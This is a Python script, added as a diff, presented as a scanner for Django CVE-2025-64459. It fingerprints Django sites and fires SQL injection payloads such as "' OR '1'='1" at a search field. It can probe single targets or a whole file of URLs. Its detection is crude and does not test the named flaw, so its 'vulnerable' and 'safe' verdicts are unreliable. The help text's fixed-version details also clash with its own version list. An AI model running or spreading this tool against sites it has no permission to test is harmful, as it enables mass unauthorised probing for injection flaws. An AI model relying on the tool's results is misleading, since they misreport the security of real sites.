@@ -1,0 +1,701 @@
+#!/usr/bin/env python3
+"""
+Django CVE-2025-64459 Scanner - Professional Menu Version
+"""
+
+import os
+import sys
+import re
+import json
+import time
+import requests
+import argparse
+from datetime import datetime
+from urllib.parse import urljoin, urlparse
+
+requests.packages.urllib3.disable_warnings()
+USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+
+class Colors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    WHITE = '\033[97m'
+    RED = '\033[91m'
+    END = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+def clear_screen():
+
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def print_banner():
+
+    banner = f"""
+{Colors.CYAN}{Colors.BOLD}
+╔══════════════════════════════════════════════════════════╗
+║                                                          ║
+║        ██████╗      ██╗  ██╗    ██████╗ ███╗   ██╗       ║
+║        ██╔══██╗     ╚██╗██╔╝    ██╔══██╗████╗  ██║       ║
+║        ██║  ██║      ╚███╔╝     ██████╔╝██╔██╗ ██║       ║
+║        ██║  ██║      ██╔██╗     ██╔═══╝ ██║╚██╗██║       ║
+║        ██████╔╝     ██╔╝ ██╗    ██║     ██║ ╚████║       ║
+║        ╚═════╝      ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═══╝       ║
+║                                                          ║
+║        Django CVE-2025-64459 Scanner - v1.0              ║
+║         Created by > t.me/Red_Rooted_ghost               ║
+║                                                          ║
+╚══════════════════════════════════════════════════════════╝
+{Colors.END}
+    """
+    print(banner)
+
+def print_menu():
+
+    print(f"\n{Colors.BOLD}{Colors.YELLOW}┌────────────────────────────────────────────┐{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}│              MAIN MENU                     │{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}├────────────────────────────────────────────┤{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}│  {Colors.GREEN}1. {Colors.CYAN}Auto Scan (Fully Automatic)            {Colors.YELLOW}│{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}│  {Colors.GREEN}2. {Colors.CYAN}Manual Scan (Advanced Users)           {Colors.YELLOW}│{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}│  {Colors.GREEN}3. {Colors.CYAN}Django Version Detection               {Colors.YELLOW}│{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}│  {Colors.GREEN}4. {Colors.CYAN}Bulk Scan from File                    {Colors.YELLOW}│{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}│  {Colors.GREEN}5. {Colors.CYAN}About & Help                           {Colors.YELLOW}│{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}│  {Colors.GREEN}0. {Colors.RED} Exit                                  {Colors.YELLOW}│{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}└────────────────────────────────────────────┘{Colors.END}")
+
+class DjangoDetector:
+
+    DJANGO_SIGNATURES = {
+        'strong': [
+            'csrfmiddlewaretoken',
+            'django.contrib',
+            'settings.DEBUG',
+            '__debug__',
+            'wsgi.application',
+        ],
+        'medium': [
+            'Django',
+            'django/',
+            'django.core',
+            'django.db',
+        ],
+        'weak': [
+            'admin/login',
+            'static/admin',
+            'media/',
+            'static/',
+        ]
+    }
+
+    DJANGO_VERSIONS = {
+        '3.2.x': ['django/3.2', 'Django==3.2'],
+        '4.0.x': ['django/4.0', 'Django==4.0'],
+        '4.1.x': ['django/4.1', 'Django==4.1'],
+        '4.2.x': ['django/4.2', 'Django==4.2'],
+        '5.0.x': ['django/5.0', 'Django==5.0'],
+        '5.1.x': ['django/5.1', 'Django==5.1'],
+        '5.2.x': ['django/5.2', 'Django==5.2'],
+    }
+
+    @staticmethod
+    def is_django_site(url):
+
+        try:
+            headers = {'User-Agent': USER_AGENT}
+            response = requests.get(url, headers=headers, timeout=10, verify=False)
+
+            if response.status_code != 200:
+                return False, "Failed to load page"
+
+            content = response.text.lower()
+            headers_str = str(response.headers).lower()
+
+
+            score = 0
+            details = []
+
+
+            for sig in DjangoDetector.DJANGO_SIGNATURES['strong']:
+                if sig.lower() in content or sig.lower() in headers_str:
+                    score += 3
+                    details.append(f"✓ Strong: {sig}")
+
+            for sig in DjangoDetector.DJANGO_SIGNATURES['medium']:
+                if sig.lower() in content or sig.lower() in headers_str:
+                    score += 2
+                    details.append(f"✓ Medium: {sig}")
+
+            for sig in DjangoDetector.DJANGO_SIGNATURES['weak']:
+                if sig.lower() in content:
+                    score += 1
+                    details.append(f"✓ Weak: {sig}")
+
+            if '<form' in content:
+                score += 1
+                details.append("✓ Has forms")
+
+            if score >= 3:
+                return True, details
+            else:
+                return False, ["Not enough Django signatures found"]
+
+        except Exception as e:
+            return False, [f"Error: {str(e)}"]
+
+    @staticmethod
+    def detect_django_version(url):
+
+        versions_found = []
+
+        try:
+            endpoints = [
+                '/admin/', '/static/admin/', '/api/',
+                '/', '/login/', '/accounts/login/'
+            ]
+
+            for endpoint in endpoints:
+                test_url = urljoin(url, endpoint)
+                try:
+                    resp = requests.get(test_url, timeout=5, verify=False)
+                    content = resp.text.lower()
+
+                    for version, patterns in DjangoDetector.DJANGO_VERSIONS.items():
+                        for pattern in patterns:
+                            if pattern.lower() in content:
+                                if version not in versions_found:
+                                    versions_found.append(version)
+                except:
+                    continue
+
+            return versions_found if versions_found else ["Unknown"]
+
+        except Exception as e:
+            return [f"Error detecting version: {str(e)}"]
+
+class CVEScanner:
+
+
+    VULNERABLE_VERSIONS = ['5.1.x', '5.0.x', '4.2.x', '4.1.x', '3.2.x']
+
+    PAYLOADS = [
+        {"payload": "OR 1=1 OR", "description": "Basic TRUE condition"},
+        {"payload": "' OR '1'='1", "description": "String-based injection"},
+        {"payload": "AND 1=0 AND", "description": "Basic FALSE condition"},
+        {"payload": "' OR 'a'='a", "description": "Alternative string injection"},
+    ]
+
+    @staticmethod
+    def test_vulnerability(url, verbose=False):
+
+        results = []
+
+        try:
+            session = requests.Session()
+            session.headers.update({'User-Agent': USER_AGENT})
+
+            response = session.get(url, timeout=10, verify=False)
+            if response.status_code != 200:
+                return {"error": f"HTTP {response.status_code}"}
+
+            csrf_token = None
+            csrf_patterns = [
+                r'name="csrfmiddlewaretoken" value="([^"]+)"',
+                r'csrf_token["\']?: ["\']([^"\']+)["\']',
+            ]
+
+            for pattern in csrf_patterns:
+                match = re.search(pattern, response.text)
+                if match:
+                    csrf_token = match.group(1)
+                    break
+
+            for p in CVEScanner.PAYLOADS:
+                if verbose:
+                    print(f"  Testing: {p['description']}")
+
+                data = {'search': p['payload']}
+                if csrf_token:
+                    data['csrfmiddlewaretoken'] = csrf_token
+
+                try:
+                    post_response = session.post(
+                        url,
+                        data=data,
+                        timeout=10,
+                        verify=False
+                    )
+
+                    analysis = CVEScanner.analyze_response(
+                        response.text,
+                        post_response.text,
+                        p['payload']
+                    )
+
+                    if analysis['vulnerable']:
+                        results.append({
+                            'payload': p['payload'],
+                            'description': p['description'],
+                            'analysis': analysis['reason'],
+                            'response_diff': analysis.get('diff', 0)
+                        })
+
+                except Exception as e:
+                    if verbose:
+                        print(f"    Error: {e}")
+                    continue
+
+            return {
+                'tested': len(CVEScanner.PAYLOADS),
+                'vulnerable_payloads': results,
+                'csrf_found': csrf_token is not None
+            }
+
+        except Exception as e:
+            return {"error": str(e)}
+
+    @staticmethod
+    def analyze_response(baseline_html, exploit_html, payload):
+
+        len_diff = abs(len(baseline_html) - len(exploit_html))
+
+        sql_errors = [
+            'sql', 'syntax', 'error', 'mysql', 'postgresql',
+            'sqlite', 'database', 'query failed'
+        ]
+
+        error_found = False
+        for error in sql_errors:
+            if error in exploit_html.lower() and error not in baseline_html.lower():
+                error_found = True
+                break
+
+        success_indicators = [
+            '1=1', 'true', 'success', 'admin', 'administrator',
+            'all users', 'all records', 'password', 'email'
+        ]
+
+        success_found = False
+        for indicator in success_indicators:
+            if indicator in exploit_html.lower() and indicator not in baseline_html.lower():
+                success_found = True
+                break
+
+        if error_found:
+            return {
+                'vulnerable': True,
+                'reason': 'SQL errors found in response',
+                'diff': len_diff
+            }
+        elif success_found and len_diff > 100:
+            return {
+                'vulnerable': True,
+                'reason': 'Successful injection indicators found',
+                'diff': len_diff
+            }
+        elif len_diff > 500:
+            return {
+                'vulnerable': True,
+                'reason': 'Significant content length difference',
+                'diff': len_diff
+            }
+        else:
+            return {
+                'vulnerable': False,
+                'reason': 'No clear vulnerability indicators',
+                'diff': len_diff
+            }
+
+def auto_scan():
+
+    clear_screen()
+    print_banner()
+
+    print(f"\n{Colors.BOLD}{Colors.GREEN}┌────────────────────────────────────────────┐{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.GREEN}│              AUTO SCAN MODE                │{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.GREEN}└────────────────────────────────────────────┘{Colors.END}")
+
+    url = input(f"\n{Colors.CYAN}Enter target URL: {Colors.END}").strip()
+
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+
+    print(f"\n{Colors.YELLOW}[*] Starting intelligent scan...{Colors.END}")
+
+    print(f"\n{Colors.CYAN}[1] Detecting Django...{Colors.END}")
+    detector = DjangoDetector()
+    is_django, details = detector.is_django_site(url)
+
+    if not is_django:
+        print(f"{Colors.RED}[-] This doesn't appear to be a Django site!{Colors.END}")
+        print(f"\n{Colors.YELLOW}Detection details:{Colors.END}")
+        for detail in details:
+            print(f"  {detail}")
+
+        choice = input(f"\n{Colors.YELLOW}Continue anyway? (y/n): {Colors.END}").lower()
+        if choice != 'y':
+            input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
+            return
+
+    print(f"\n{Colors.CYAN}[2] Detecting Django version...{Colors.END}")
+    versions = detector.detect_django_version(url)
+    print(f"  {Colors.WHITE}Possible versions: {', '.join(versions)}{Colors.END}")
+
+    vulnerable_versions = [v for v in versions if v in CVEScanner.VULNERABLE_VERSIONS]
+    if vulnerable_versions:
+        print(f"  {Colors.RED}⚠ Potentially vulnerable versions detected!{Colors.END}")
+
+    print(f"\n{Colors.CYAN}[3] Scanning for CVE-2025-64459...{Colors.END}")
+    scanner = CVEScanner()
+    results = scanner.test_vulnerability(url, verbose=True)
+
+
+    print(f"\n{Colors.BOLD}{Colors.GREEN}┌────────────────────────────────────────────┐{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.GREEN}│              SCAN RESULTS                  │{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.GREEN}└────────────────────────────────────────────┘{Colors.END}")
+
+    print(f"\n{Colors.WHITE}Target: {Colors.CYAN}{url}{Colors.END}")
+    print(f"{Colors.WHITE}Django Detected: {Colors.GREEN if is_django else Colors.RED}{is_django}{Colors.END}")
+    print(f"{Colors.WHITE}Versions: {Colors.YELLOW}{', '.join(versions)}{Colors.END}")
+
+    if 'error' in results:
+        print(f"\n{Colors.RED}Error: {results['error']}{Colors.END}")
+    else:
+        print(f"\n{Colors.WHITE}Payloads tested: {results['tested']}{Colors.END}")
+        print(f"{Colors.WHITE}CSRF Token found: {results['csrf_found']}{Colors.END}")
+
+        if results['vulnerable_payloads']:
+            print(f"\n{Colors.RED}{Colors.BOLD}⚠ VULNERABILITY DETECTED!{Colors.END}")
+            print(f"{Colors.RED}The site appears to be vulnerable.{Colors.END}")
+
+            for vuln in results['vulnerable_payloads']:
+                print(f"\n  {Colors.YELLOW}Payload: {vuln['payload']}{Colors.END}")
+                print(f"  {Colors.WHITE}Reason: {vuln['analysis']}{Colors.END}")
+        else:
+            print(f"\n{Colors.GREEN}✓ No vulnerability detected.{Colors.END}")
+            print(f"{Colors.GREEN}The site appears to be safe.{Colors.END}")
+
+
+    print(f"\n{Colors.BOLD}{Colors.BLUE}Recommendations:{Colors.END}")
+    if results.get('vulnerable_payloads'):
+        print(f"  {Colors.RED}• Urgently update Django to latest version{Colors.END}")
+        print(f"  {Colors.RED}• Implement proper input validation{Colors.END}")
+        print(f"  {Colors.RED}• Use parameterized queries{Colors.END}")
+    elif vulnerable_versions:
+        print(f"  {Colors.YELLOW}• Consider updating Django version{Colors.END}")
+        print(f"  {Colors.YELLOW}• Review security configurations{Colors.END}")
+    else:
+        print(f"  {Colors.GREEN}• Keep Django updated regularly{Colors.END}")
+        print(f"  {Colors.GREEN}• Continue security monitoring{Colors.END}")
+
+    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
+
+
+def manual_scan():
+
+    clear_screen()
+    print_banner()
+
+    print(f"\n{Colors.BOLD}{Colors.BLUE}┌────────────────────────────────────────────┐{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.BLUE}│            MANUAL SCAN MODE                │{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.BLUE}└────────────────────────────────────────────┘{Colors.END}")
+
+    print(f"\n{Colors.YELLOW}Advanced options for penetration testers{Colors.END}")
+
+    url = input(f"\n{Colors.CYAN}Target URL: {Colors.END}").strip()
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+
+    endpoint = input(f"{Colors.CYAN}Specific endpoint (optional): {Colors.END}").strip()
+    if endpoint:
+        url = urljoin(url, endpoint)
+
+    custom_payload = input(f"{Colors.CYAN}Custom payload (or Enter for default): {Colors.END}").strip()
+
+    print(f"\n{Colors.YELLOW}[*] Starting manual scan...{Colors.END}")
+
+    try:
+        response = requests.get(url, timeout=10, verify=False)
+        print(f"{Colors.GREEN}[+] Connected successfully (HTTP {response.status_code}){Colors.END}")
+    except Exception as e:
+        print(f"{Colors.RED}[-] Connection failed: {e}{Colors.END}")
+        input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
+        return
+
+
+    csrf_token = None
+    csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
+    if csrf_match:
+        csrf_token = csrf_match.group(1)
+        print(f"{Colors.GREEN}[+] CSRF token found{Colors.END}")
+    else:
+        print(f"{Colors.YELLOW}[-] CSRF token not found{Colors.END}")
+
+
+    payloads = [custom_payload] if custom_payload else ["OR 1=1 OR", "' OR '1'='1"]
+
+    for payload in payloads:
+        print(f"\n{Colors.CYAN}[*] Testing payload: {payload}{Colors.END}")
+
+        data = {'search': payload}
+        if csrf_token:
+            data['csrfmiddlewaretoken'] = csrf_token
+
+        try:
+            post_resp = requests.post(url, data=data, timeout=10, verify=False)
+
+
+            if len(response.text) != len(post_resp.text):
+                diff = abs(len(response.text) - len(post_resp.text))
+                print(f"  {Colors.YELLOW}[!] Response length changed by {diff} bytes{Colors.END}")
+
+                if diff > 100:
+                    print(f"  {Colors.RED}[!] Possible SQL injection!{Colors.END}")
+
+
+            sql_indicators = ['sql', 'syntax', 'error', 'mysql']
+            for indicator in sql_indicators:
+                if indicator in post_resp.text.lower():
+                    print(f"  {Colors.RED}[!] SQL error indicator found: '{indicator}'{Colors.END}")
+
+        except Exception as e:
+            print(f"  {Colors.RED}[-] Error: {e}{Colors.END}")
+
+    print(f"\n{Colors.GREEN}[+] Manual scan completed{Colors.END}")
+    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
+
+
+def version_detection():
+
+    clear_screen()
+    print_banner()
+
+    print(f"\n{Colors.BOLD}{Colors.MAGENTA}┌────────────────────────────────────────────┐{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.MAGENTA}│        DJANGO VERSION DETECTION            │{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.MAGENTA}└────────────────────────────────────────────┘{Colors.END}")
+
+    url = input(f"\n{Colors.CYAN}Enter Django site URL: {Colors.END}").strip()
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+
+    print(f"\n{Colors.YELLOW}[*] Detecting Django and its version...{Colors.END}")
+
+    detector = DjangoDetector()
+
+
+    is_django, details = detector.is_django_site(url)
+
+    if not is_django:
+        print(f"\n{Colors.RED}[-] This doesn't appear to be a Django site!{Colors.END}")
+        print(f"\n{Colors.YELLOW}Detection details:{Colors.END}")
+        for detail in details:
+            print(f"  {detail}")
+    else:
+        print(f"\n{Colors.GREEN}[+] Confirmed: This is a Django site{Colors.END}")
+
+
+        versions = detector.detect_django_version(url)
+
+        print(f"\n{Colors.CYAN}[*] Version detection results:{Colors.END}")
+        for version in versions:
+            if version in CVEScanner.VULNERABLE_VERSIONS:
+                print(f"  {Colors.RED}⚠ {version} - Potentially vulnerable to CVE-2025-64459{Colors.END}")
+            else:
+                print(f"  {Colors.GREEN}✓ {version}{Colors.END}")
+
+
+        print(f"\n{Colors.YELLOW}Django signatures found:{Colors.END}")
+        for detail in details:
+            if detail.startswith('✓'):
+                print(f"  {detail}")
+
+    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
+
+def bulk_scan():
+
+    clear_screen()
+    print_banner()
+
+    print(f"\n{Colors.BOLD}{Colors.CYAN}┌────────────────────────────────────────────┐{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.CYAN}│             BULK SCAN MODE                 │{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.CYAN}└────────────────────────────────────────────┘{Colors.END}")
+
+    file_path = input(f"\n{Colors.CYAN}Enter file path with URLs (one per line): {Colors.END}").strip()
+
+    if not os.path.exists(file_path):
+        print(f"{Colors.RED}[-] File not found!{Colors.END}")
+        input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
+        return
+
+    try:
+        with open(file_path, 'r') as f:
+            urls = [line.strip() for line in f if line.strip()]
+
+        if not urls:
+            print(f"{Colors.RED}[-] No URLs found in file{Colors.END}")
+            return
+
+        print(f"\n{Colors.GREEN}[+] Found {len(urls)} URLs to scan{Colors.END}")
+
+        results = []
+        detector = DjangoDetector()
+        scanner = CVEScanner()
+
+        for i, url in enumerate(urls, 1):
+            if not url.startswith(('http://', 'https://')):
+                url = 'http://' + url
+
+            print(f"\n{Colors.YELLOW}[{i}/{len(urls)}] Scanning: {url}{Colors.END}")
+
+            try:
+
+                is_django, _ = detector.is_django_site(url)
+
+                if not is_django:
+                    print(f"  {Colors.YELLOW}[-] Skipping (not Django){Colors.END}")
+                    continue
+
+
+                scan_result = scanner.test_vulnerability(url)
+
+                if 'error' not in scan_result:
+                    vuln_count = len(scan_result.get('vulnerable_payloads', []))
+
+                    if vuln_count > 0:
+                        print(f"  {Colors.RED}[!] VULNERABLE ({vuln_count} payloads){Colors.END}")
+                        results.append({
+                            'url': url,
+                            'vulnerable': True,
+                            'payloads': scan_result['vulnerable_payloads']
+                        })
+                    else:
+                        print(f"  {Colors.GREEN}[+] Secure{Colors.END}")
+                        results.append({
+                            'url': url,
+                            'vulnerable': False
+                        })
+
+            except Exception as e:
+                print(f"  {Colors.RED}[-] Error: {e}{Colors.END}")
+                continue
+
+
+        if results:
+            output_file = f"scan_results_{int(time.time())}.json"
+            with open(output_file, 'w') as f:
+                json.dump(results, f, indent=2)
+
+            print(f"\n{Colors.GREEN}[+] Results saved to: {output_file}{Colors.END}")
+
+
+            vulnerable_count = sum(1 for r in results if r.get('vulnerable'))
+            print(f"\n{Colors.BOLD}Summary:{Colors.END}")
+            print(f"  Total scanned: {len(results)}")
+            print(f"  Vulnerable: {vulnerable_count}")
+            print(f"  Secure: {len(results) - vulnerable_count}")
+
+    except Exception as e:
+        print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
+
+    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
+
+def show_help():
+
+    clear_screen()
+    print_banner()
+
+    print(f"\n{Colors.BOLD}{Colors.GREEN}┌────────────────────────────────────────────┐{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.GREEN}│               HELP & ABOUT                 │{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.GREEN}└────────────────────────────────────────────┘{Colors.END}")
+
+    help_text = f"""
+{Colors.BOLD}{Colors.CYAN}About this tool:{Colors.END}
+This is a professional scanner specifically designed to detect
+CVE-2025-64459 SQL injection vulnerability in Django framework.
+It intelligently detects Django sites and avoids false positives.
+
+{Colors.BOLD}{Colors.CYAN}CVE-2025-64459:{Colors.END}
+• Affects: Django 5.1.x, 5.0.x, 4.2.x, 4.1.x, 3.2.x
+• Type: SQL Injection in QuerySet methods
+• Impact: Data leakage, unauthorized access
+• Fixed in: Django 5.1.14, 5.2.8, 4.2.26
+
+{Colors.BOLD}{Colors.CYAN}Scan modes:{Colors.END}
+1. {Colors.GREEN}Auto Scan{Colors.END} - Fully automatic detection and scanning
+   • Django detection
+   • Version detection
+   • Vulnerability scanning
+   • Smart analysis
+
+2. {Colors.BLUE}Manual Scan{Colors.END} - For advanced users
+   • Custom endpoints
+   • Custom payloads
+   • Manual analysis
+
+3. {Colors.MAGENTA}Version Detection{Colors.END} - Detect Django version
+   • Signature analysis
+   • Version identification
+   • Vulnerability check
+
+4. {Colors.CYAN}Bulk Scan{Colors.END} - Scan multiple sites
+   • Load URLs from file
+   • Batch processing
+   • JSON output
+
+{Colors.BOLD}{Colors.YELLOW}Important Notes:{Colors.END}
+• Use only on systems you own or have permission to test
+• This tool is for security assessment and educational purposes
+• Always update Django to latest version for security
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+Creator Telegram channel: t.me/Red_Rooted_ghost
+GitHub: https://github.com/Dark-Ghost-x
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+"""
+
+    print(help_text)
+    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
+
+def main():
+
+    while True:
+        clear_screen()
+        print_banner()
+        print_menu()
+
+        try:
+            choice = input(f"\n{Colors.CYAN}Select option (0-5): {Colors.END}").strip()
+
+            if choice == '0':
+                print(f"\n{Colors.GREEN}Goodbye!{Colors.END}")
+                sys.exit(0)
+            elif choice == '1':
+                auto_scan()
+            elif choice == '2':
+                manual_scan()
+            elif choice == '3':
+                version_detection()
+            elif choice == '4':
+                bulk_scan()
+            elif choice == '5':
+                show_help()
+            else:
+                print(f"\n{Colors.RED}Invalid option!{Colors.END}")
+                time.sleep(1)
+
+        except KeyboardInterrupt:
+            print(f"\n\n{Colors.YELLOW}Interrupted by user{Colors.END}")
+            sys.exit(0)
+        except Exception as e:
+            print(f"\n{Colors.RED}Error: {e}{Colors.END}")
+            time.sleep(2)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{Colors.YELLOW}Goodbye!{Colors.END}")
+        sys.exit(0)
